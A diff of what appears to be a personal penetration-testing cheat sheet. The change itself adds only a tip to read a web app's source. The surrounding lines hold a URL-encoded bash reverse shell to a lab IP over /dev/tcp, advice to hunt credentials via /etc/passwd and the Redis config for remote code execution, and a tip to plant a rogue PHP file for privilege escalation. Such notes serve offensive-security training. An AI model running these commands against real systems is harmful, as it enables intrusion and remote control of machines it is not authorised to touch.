@@ -36,6 +36,7 @@
   ``` bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 ```
 1. try find useful password after /etc/passwd for opening services (you scanned!) e.g. redis have rce -> go get ``` /etc/redis/redis.conf ```
 2. can use it to priv esc too! -> creating a rogue php inside the file system and load it e.g. /run/redis/test.php || CHECK ALL WRITABLE PATH!!c
+3. See the source code of the web! e.g. index.php, main.py
 ### Interesting file path
 1. [Windows] Progra~1 = program files | Progra~2 = program files (x86)
 
